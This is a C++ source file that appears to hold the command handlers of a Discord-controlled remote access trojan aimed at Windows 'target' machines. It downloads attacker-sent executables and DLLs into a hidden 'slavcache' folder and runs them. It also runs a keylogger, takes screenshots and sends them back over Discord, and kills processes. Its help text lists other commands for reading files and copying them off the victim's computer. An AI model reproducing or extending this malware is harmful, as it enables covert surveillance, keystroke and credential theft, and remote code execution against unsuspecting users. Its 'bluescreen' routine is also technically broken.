
#include "tasks.h"
#include <TlHelp32.h>
#include <wtsapi32.h>
#include "helper.h"
#include <Windows.h>
#include <atlstr.h>
#include <atlimage.h>
#include <codecvt>
#include "keylogger.h"

/* all windows specific stuff such as popups */

#define _CRT_SECURE_NO_WARNINGS
#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS 
#define _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Urlmon.lib")

bool keyloggerActive = false;

std::string allKeys;

HANDLE GetProcessFromName(const char* name);

DWORD WINAPI keylogger_thread(LPVOID lpParameter);

bool is_number(const std::string& s);

/* Messagebox popup to user */
std::string command_popup(std::vector<std::string> args) {
	if (args.size() == 1)
		return "Please give a message to popup!";

	/* in order to incorporate spaces, take all args as one string*/
	if (args.size() >= 2) {

		std::string msg;

		for (int i = 1; i < args.size(); i++) {
			msg += args[i] + ' ';
		}

		MessageBoxA(NULL, msg.c_str(), "", MB_OK);
	}

	return "Popup Sent!";
}

std::string command_bluescreen(std::vector<std::string> args) {
	HANDLE handle = GetProcessFromName("ntoskrnl.exe");
	if (!handle)
		return "failed to bluescreen";
	if (!TerminateProcess(handle, 0))
		return "bluescreen failed :(";
	return "a";
}

std::string command_cmdspawn(std::vector<std::string> args) {

	if (args.size() < 4)
		return "Invalid Format! Correct format is !cmdspawn {amount of windows} {msg} {seconds}";

	if (!is_number(args[1]))
		return "The amount of windows must be a number!";

	if (!is_number(args.back()))
		return "The amount of seconds must be a number!";
	int times = std::stoi(args[1]);

	std::string msg;

	for (int i = 2; i < args.size() - 1; i++) {
		msg += args[i] + ' ';
	}

	for (int i = 0; i < times; i++) {
		system(("start cmd.exe /k \"echo " + msg + "&timeout " + args.back() + " >nul /NOBREAK&exit\"").c_str());
	}

	return "Spawned Command Promts";
}

std::string command_applicationclose(std::vector<std::string> args) {
	if (args.size() < 2)
		return "Please give an application to close!";

	HANDLE handle;
	if (ends_with(args[1], ".exe"))
		handle = GetProcessFromName(args[1].c_str());
	else
		handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, std::stoi(args[1]));
	if (!handle)
		return "Application not found!";

	/* terminates process */
	int code = TerminateProcess(handle, 0);
	
	CloseHandle(handle);

	if (code == 0)
		return "Unable to close process!";
	return "Successfuly closed proccess!";

}

/* downloads attatchment into slavcache */
std::string command_downloadfile(std::vector<std::string> args, const dpp::message_create_t evnt) {
	if (evnt.msg.attachments.size() < 1)
		return "please attatch a file to download";
	std::vector<std::string> splitUrl = split(evnt.msg.attachments[0].url, "/");

	/* downloads attatchment URL to appdata/slavcache/{name-of-file} */
	std::string path = (getenv("APPDATA") + (std::string)"/slavcache/" + splitUrl.back());
	URLDownloadToFileA(NULL, evnt.msg.attachments[0].url.c_str(), path.c_str(), 0, NULL);
	return (std::string)"downloaded file to " + path;
}


std::string command_applicationlist(std::vector<std::string> args) {

	bool compressed = false;
	bool no_pid = false;

	for (int i = 1; i < args.size(); i++) {
		if (args[i] == "--compressed")
			compressed = true;
		else if (args[i] == "--no-pid")
			no_pid = true;
	}

	std::string msg;

	WTS_PROCESS_INFOA* pWPIs = NULL;
	DWORD dwProcCount = 0;
	if (WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount))
	{
		//Go through all processes retrieved
		for (DWORD i = 0; i < dwProcCount; i++)
		{
			if (compressed) {
				if ((std::string)pWPIs[i].pProcessName != "svchost.exe") {
					msg += pWPIs[i].pProcessName;
					if (!no_pid) {
						msg += " - ";
						msg += std::to_string(pWPIs[i].ProcessId);
						msg += '\n';
					}
				}
			}
			else {
				msg += pWPIs[i].pProcessName;
				if (!no_pid) {
					msg += " - ";
					msg += std::to_string(pWPIs[i].ProcessId);
					msg += '\n';
				}
			}
		}
	}

	//Free memory
	if (pWPIs)
	{
		WTSFreeMemory(pWPIs);
		pWPIs = NULL;
	}
	return msg;
}

std::string command_runprogram(std::vector<std::string> args, const dpp::message_create_t evnt) {
	if (evnt.msg.attachments.size() < 1)
		return "Please attatch a .exe file to run on the target computer";

	// Create a hidden directory to store programs	
	CreateDirectoryA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), NULL);
	SetFileAttributesA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), FILE_ATTRIBUTE_HIDDEN);

	URLDownloadToFileA(NULL, evnt.msg.attachments[0].url.c_str(), (getenv("APPDATA") + (std::string)"/slavcache/file.exe").c_str(), 0, NULL);
	ShellExecuteA(NULL, "open", (getenv("APPDATA") + (std::string)"/slavcache/file.exe").c_str(), NULL, NULL, SW_SHOWDEFAULT);
	return "Ran Program Successfuly!";
}



std::string command_loadlibrary(std::vector<std::string> args, const dpp::message_create_t evnt) {
	if (evnt.msg.attachments.size() < 1)
		return "Please attatch a .dll file to run on the target computer";

	// Create a hidden directory to store programs	
	CreateDirectoryA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), NULL);
	SetFileAttributesA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), FILE_ATTRIBUTE_HIDDEN);

	URLDownloadToFileA(NULL, evnt.msg.attachments[0].url.c_str(), (getenv("APPDATA") + (std::string)"/slavcache/file.dll").c_str(), 0, NULL);
	LoadLibraryA((getenv("APPDATA") + (std::string)"/slavcache/file.dll").c_str());
	return "Loaded Library Successfuly";
}

std::string command_keyloggerstart(std::vector<std::string> args, dpp::message_create_t evnt) {
	DWORD threadID;
	dpp::message_create_t* passed_event = new dpp::message_create_t(evnt);
	
	keyloggerActive = true;
	CreateThread(0, 0, keylogger_thread, reinterpret_cast<void*>(passed_event), 0, NULL);
	return "Start Keylogger";
}

std::string command_keyloggerstop(std::vector<std::string> args, const dpp::message_create_t evnt) {
	keyloggerActive = false;
	Sleep(250);
	std::string s = (allKeys.c_str() + (std::string)"\nStopped Keylogger");
	std::cout << "s: "<< (int)s[1] << '\n';
	return  std::string(allKeys.c_str() + (std::string)"\nStopped Keylogger");
}


std::string command_custom(std::vector<std::string> args, const dpp::message_create_t evnt) {
	std::string path = getenv("APPDATA") + (std::string)"/slavcache";

	// if the path isnt valid, its not a command
	if (!fopen(path.c_str(), "rb"))
		return "";

	// additional information
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	// set the size of the structures
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	// start the program up
	bool worked = CreateProcessA(path.c_str(),   // the path
		NULL,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
	);

	if (worked)
		return "Process Executed Successfuly!";
	else
		return "Process Failed to Execute.";

}

HANDLE GetProcessFromName(const char* name) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			char* file = new char[MAX_PATH];
			wcstombs(file, entry.szExeFile, MAX_PATH);

			if (_stricmp(file, name) == 0)
			{
				CloseHandle(snapshot);
				return OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);


			}
		}
	}

	CloseHandle(snapshot);
	return NULL;
}

std::string command_changebackround(std::vector<std::string> args, const dpp::message_create_t evnt) {
	if (evnt.msg.attachments.size() < 1)
		return "Please attatch a jpeg file to run on the target computer";

	// Create a hidden directory to store the image	
	CreateDirectoryA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), NULL);
	SetFileAttributesA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), FILE_ATTRIBUTE_HIDDEN);

	// downloading the image to a file
	URLDownloadToFileA(NULL, evnt.msg.attachments[0].url.c_str(), (getenv("APPDATA") + (std::string)"/slavcache/backround.jpg").c_str(), 0, NULL);
	SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)(getenv("APPDATA") + (std::string)"/slavcache/backround.jpg").c_str(), SPIF_UPDATEINIFILE);
	return "Changed Backround!";
}

std::string command_screenshot(std::vector<std::string> args, const dpp::message_create_t& evnt) {
	int monitorNumber;
	if (args.size() != 1)
		monitorNumber = std::stoi(args[1]);



	HDC hScreenDC = GetDC(nullptr);
	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
	int width = GetDeviceCaps(hScreenDC, HORZRES);
	int height = GetDeviceCaps(hScreenDC, VERTRES);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
	HBITMAP hOldBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hBitmap));
	BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
	hBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hOldBitmap));
	DeleteDC(hMemoryDC);
	DeleteDC(hScreenDC);


	CImage image;
	image.Attach(hBitmap);
	
	std::wstring s = (_wgetenv(L"APPDATA") + (std::wstring)L"/slavcache/backround.jpg");
	image.Save(s.c_str());
	dpp::message msg;


	msg.add_file("screenshot.jpg", dpp::utility::read_file(getenv("APPDATA") + (std::string)"/slavcache/backround.jpg"));
	evnt.send(msg);
	return "";
}

std::string command_help(std::vector<std::string> args) {
	return 
		"cd {directory} - change active directory to {directory}\n"
		"pwd - lists active path\n"
		"ls - lists all files and directorys in the active directory\n"
		"readfile {path} - reads the file given by the path\n"
		"openfile {path} - copies the file from the target pc into an attatchment\n"
		"popup {msg} - pops up {msg} on the targets screen\n"
		"cmdspawn {amount of windows} {message} {seconds} - pops up a {amount of windows} of command prompt with the message of {msg} for {seconds} seconds\n"
		"appclose {appid}/{appname} - closes the application with the proccess id of {appid} or with the name of {appname}\n"
		"applist - lists all applications and their proccess ids\n"
		"runprogram - runs the program attatched to the message\n"
		"loadlibrary - loads the library attatched to the message\n"
		"changebackround - changes the background image of the targets desktop to the attatched image\n"
		"downloadfile - downloads the attatched file to the target pc\n"
		"bluescreen - bluescreens the target computer\n"
		"keylog_start - starts the keylogger\n"
		"keylog_stop - stops the keylogger\n"
		"screenshot - takes a screenshot of the targets pc\n"
		"help - this message";
}


bool ends_with(std::string const& fullString, std::string const& ending) {
	if (fullString.length() >= ending.length()) {
		return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
	}
	else {
		return false;
	}
}

bool is_number(const std::string& s)
{
	std::string::const_iterator it = s.begin();
	while (it != s.end() && std::isdigit(*it)) ++it;
	return !s.empty() && it == s.end();
}

DWORD WINAPI keylogger_thread(LPVOID lpParameter) {	
	while (keyloggerActive) {
		allKeys += keylog();
	}
	return 0;
}